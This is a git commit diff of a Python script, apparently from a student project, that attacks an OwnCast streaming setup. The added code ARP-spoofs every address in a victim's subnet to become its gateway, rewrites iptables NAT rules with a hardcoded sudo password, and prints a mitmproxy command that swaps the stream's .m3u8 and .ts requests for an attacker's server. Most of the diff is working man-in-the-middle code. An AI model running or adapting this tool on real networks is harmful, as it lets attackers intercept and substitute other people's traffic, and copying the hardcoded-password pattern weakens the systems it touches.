68ba8f9edfb57960eea0bd8862958985c5e02960
Chris <christopherbloemers@outlook.com>
2021-06-30 23:32:38 +0200

    Final Commit + new approach: ARP the whole subnet + new approach: use mitmproxy + added iptables integration

--- sniffer.py
+++ sniffer.py
@@ -1,122 +1,178 @@
 import ipaddress
 from getmac import get_mac_address as gma
 from scapy.all import *
-from scapy.layers.http import *
 import argparse
-from scapy.layers.l2 import *
 import threading
+from subprocess import Popen, PIPE
+from scapy.layers.l2 import getmacbyip
+import socket
+import struct
+import netifaces
 
+# PLEASE NOTE
+# This code only runs on Ubuntu with all dependencies installed
+# This code requires you to run a given bash command in a second terminal
+
+# Used tools
 # https://mitmproxy.org/
 # https://docs.mitmproxy.org/stable/howto-transparent/
 
-# NOTES #
-# Run the following command in your Linux terminal:
-# sysctl net.ipv4.ip_forward
-# if it returns 0, then packets are not forwarded
-# this means that a MITM attack will disable communication between victim and host
-# Change this setting with:
-# sudo sysctl -w net.ipv4.ip_forward=1
-# sudo sysctl -w net.ipv6.conf.all.forwarding=1
-
-# We also need to block icmp redirects
-# sudo sysctl -w .net.ipv4.conf.all.send_redirects=0
-
-# Set up proxying
-# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
-# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 443 -j REDIRECT --to-port 8080
-# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
-# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 443 -j REDIRECT --to-port 8080
-
-# Start up MITM Proxy
-# sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost
-
-# TODO; become default gateway for victim machine
-# TODO; set up custom proxy ruleset for mitmproxy
-# TODO; cry
 
 # Read parser data
 parser = argparse.ArgumentParser(description="OwnCast Packet Interceptor")
-parser.add_argument("-host", default="192.168.56.106")  # Original OwnCast server
+parser.add_argument("-host", default="192.168.231.4")  # Original OwnCast server
 parser.add_argument("-port", default="8080")  # Port of original OwnCast server
-parser.add_argument("-fake", default="192.168.56.104")  # IP of new OwnCast server
+parser.add_argument("-fake", default="localhost")  # IP of new OwnCast server (or localhost)
 parser.add_argument("-fake_port", default="8080")  # Port of new OwnCast server
-parser.add_argument("-victim", default="192.168.56.105")  # IP of victim
-parser.add_argument("-interface", default="enp0s8")  # interface on which the victim and host are connected
+parser.add_argument("-victim", default="192.168.56.107")  # IP of victim
+parser.add_argument("-victim_interface", default="enp0s8")  # interface onto which the victim is connected
+parser.add_argument("-internet_interface", default="enp0s3")  # internet facing interface
 args = parser.parse_args()
 
-# struct.unpack("!I", socket.inet_aton(addr))[0]
+# Process parser data
 host = ipaddress.IPv4Address(args.host)
 port = args.port
-fake = ipaddress.IPv4Address(args.fake)
+victim_interface = args.victim_interface
+internet_interface = args.internet_interface
+if args.fake == 'localhost':
+    fake = netifaces.ifaddresses(victim_interface)[netifaces.AF_INET][0]['addr']
+else:
+    fake = ipaddress.IPv4Address(args.fake)
 fake_port = args.fake_port
 victim = ipaddress.IPv4Address(args.victim)
-interface = args.interface
-
-# By default we use the destination (the real OwnCast) as the fake host but assume the port is different
-# This is true in our testing model
-if fake == "":
-    fake = host
-if fake_port == "":
-    fake_port = port
-if interface == "":
-    interface = conf.iface
 
 print(f"Starting attack with this input:")
 print(f"Original OwnCast server on {host}:{port}")
 print(f"Attacker OwnCast server on {fake}:{fake_port}")
-print(f"Victim on {victim}")
-print(f"Using interface {interface}")
+print(f"Victim on {victim} via interface {victim_interface}")
+print(f"Internet facing interface {internet_interface}")
+
+# Function to run bash with superuser rights
+def run_bash(task):
+    password = "group50"
+    command = task.split()
+    p = Popen(['sudo', '-S'] + command, stdin=PIPE, stderr=PIPE, universal_newlines=True)
+    sudo_prompt = p.communicate(password + '\n')[1]
+    return sudo_prompt
 
 
-# Function to copy packets
-# Currently called when:
-# -> Request to host:port containing .m3u8
-# Currently does:
-# -> Send copy of request to fake_host:fake_port on fake_mac
-# NOTE;
-# this is v0: it is not useful yet
-def copy_pkt(this_packet):
-    global fake
+# Allow forwarding of packages
+print(f"# Enabling package forwarding")
+# sudo sysctl -w net.ipv4.ip_forward=1
+run_bash("sudo sysctl -w net.ipv4.ip_forward=1")
+# sudo sysctl -w net.ipv6.conf.all.forwarding=1
+run_bash("sudo sysctl -w net.ipv6.conf.all.forwarding=1")
 
-    # Lookup fake MAC
-    mac_fake = getmacbyip(str(fake))
-    if mac_fake is None:
-        print(f"Could not find MAC for fake ({fake})")
+# We also need to block icmp messages
+print(f"# Blocking ICMP message redirection")
+# sudo sysctl -w .net.ipv4.conf.all.send_redirects=0
+run_bash("sudo sysctl -w .net.ipv4.conf.all.send_redirects=0")
+
+# Set up proxying
+print(f"# Preparing proxy redirections [iptables]")
+# flush old configuration
+run_bash(f"sudo iptables -t nat -F")
+run_bash(f"sudo ip6tables -t nat -F")
+# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8090
+run_bash(f"sudo iptables -t nat -A PREROUTING -i {victim_interface} -p tcp --dport 80 -j REDIRECT --to-port 8090")
+# sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 8080 -j REDIRECT --to-port 8090
+run_bash(f"sudo iptables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport {port} -j REDIRECT --to-port 8090")
+# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8090
+run_bash(f"sudo ip6tables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport 80 -j REDIRECT --to-port 8090")
+# sudo ip6tables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 8080 -j REDIRECT --to-port 8090
+run_bash(f"sudo ip6tables -t nat -A PREROUTING -i {victim_interface}  -p tcp --dport {port} -j REDIRECT --to-port 8090")
+
+# Allow fallback for non-proxied data (on internet facing interface enp0s3)
+print(f"# Enabling NAT routing for other irrelevant traffic")
+# sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE
+run_bash(f"sudo iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE")
+
+
+# Start up MITM  in a thread
+def start_proxy():
+    print(f"# Enabling proxy")
+    # sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost
+    # --listen-port 8090 --map-remote "|.m3u8|//192.168.231.4:8080|//localhost:8080"
+    # --map-remote "|.ts|//192.168.231.4:8080|//localhost:8080"
+    # run_bash does not work as desired
+    print("RUN THE FOLLOWING COMMAND IN A NEW TERMINAL")
+    print(f"sudo /home/owncast/Documents/mitmproxy/mitmproxy --mode transparent --showhost --listen-port 8090 \
+    --map-remote \"|.m3u8|//{host}:{port}|//{fake}:{fake_port}\" --map-remote \
+    \"|.ts|//{host}:{port}|//{fake}:{fake_port}\"")
+
+
+# Start thread for MITM
+thread_proxy = threading.Thread(target=start_proxy, daemon=True)
+thread_proxy.start()
+
+
+# Debugging scripts
+# sudo route
+# sudo arp -a
+# sudo iptables -t nat -L
+
+# Function to become a forced gateway
+# Will make the victim think that the attacker is every device in the subnetwork 255.255.255.0
+def init_hijack(ip_victim, interface):
+    # Lookup local MAC
+    local_mac = gma(interface=interface)
+    if local_mac is None:
+        print(f"Could not find MAC for local machine")
         print(f"Aborting operation")
         return False
-    elif mac_fake == "ff:ff:ff:ff:ff:ff":
-        # Lookup local MAC
-        mac_fake = gma(interface=interface)
-        if mac_fake is None:
-            print(f"Could not find MAC for local machine")
-            print(f"Aborting operation")
-            return False
+    else:
+        print(f"Found local MAC: {local_mac}")
 
-    this_packet[IP].dst = str(fake)
-    this_packet[HTTP].Host = str(fake) + ":" +  str(fake_port)
-    this_packet[Ether].dst = mac_fake
-    send(this_packet)
-    this_packet.show()
+    # Lookup victim MAC
+    mac_victim = getmacbyip(str(ip_victim))
+    if mac_victim is None:
+        print(f"Could not find MAC for victim ({ip_victim})")
+        print(f"Aborting operation")
+        return False
+    else:
+        print(f"Found victim ({ip_victim}) MAC: {mac_victim}")
 
-# Function to print packets
-def print_pkt(this_packet):
-    # Filter only HTTP requests
-    if not this_packet.haslayer(HTTPRequest):
-        return
+    if local_mac == mac_victim:
+        print(f"You're trying to fool yourself")
+        print(f"Aborting operation")
+        return False
 
-    http = this_packet[HTTPRequest]
-    path = http.Path.decode()
-    print(f"Got packet with path {path}")
+    # Find subnetwork
+    ip_victim_net = str(ip_victim).split(".")
+    subnet = ip_victim_net[0] + "." + ip_victim_net[1] + "." + ip_victim_net[2] + "."
+    print(f"Found subnet {subnet}x")
 
-    # Filter HTTP requests for stream.m3u8
-    if 'stream.m3u8' in path or '.ts' in path:
-        copy_pkt(this_packet)
+    # Define repeating ARP injection
+    def repeat_arp(packets):
+        while True:
+            print(f"ARP attack running in background")
+            for packet in packets:
+                sendp(arp, iface=interface, verbose=False)
+                time.sleep(0.02)
 
-    # For debugging
-    # this_packet.show()
+    # Prepare arp array
+    arp_array = []
+
+    # Tell victim that we are 255.255.255.x for all x in [1, 254]
+    for x in range(1, 255):
+        # Prepare ARP packet
+        arp = Ether() / ARP()
+        arp[Ether].src = local_mac
+        arp[ARP].hwsrc = local_mac
+        arp[ARP].psrc = str(subnet + str(x))
+        arp[ARP].hwdst = mac_victim
+        arp[ARP].pdst = str(ip_victim)
+        arp_array.append(arp)
+
+    # Spawn daemon threads
+    thread_arp = threading.Thread(target=repeat_arp, args=(arp_array,))
+    thread_arp.start()
+
+    print(f"Started the injection thread")
+
 
 # Function to initiate an ARP attack
-def init_arp(ip_victim, ip_server):
+def init_arp(ip_victim, ip_server, interface):
     # Lookup local MAC
     local_mac = gma(interface=interface)
     if local_mac is None:
@@ -182,15 +238,6 @@ def init_arp(ip_victim, ip_server):
     print(f"Started the injection threads")
 
 
-# Patch for HTTP layers on ports other than port 80
-print(f"Binding port {port} as an HTTP connection port")
-bind_layers(TCP, HTTP, dport=int(port))
-bind_layers(TCP, HTTP, sport=int(port))
-
-# Run ARP Attack
-print(f"Starting MITM between {victim} and {host}")
-init_arp(victim, host)
-
-filter_mask = "dst host " + str(host) + " and dst port " + str(port)
-print(f"Filtering packets on {filter_mask}")
-pkt = sniff(filter=filter_mask, prn=print_pkt, iface=interface)
+# Run gateway attack
+print(f"Pretending to be victim's ({victim}) entire network")
+init_hijack(victim, victim_interface)
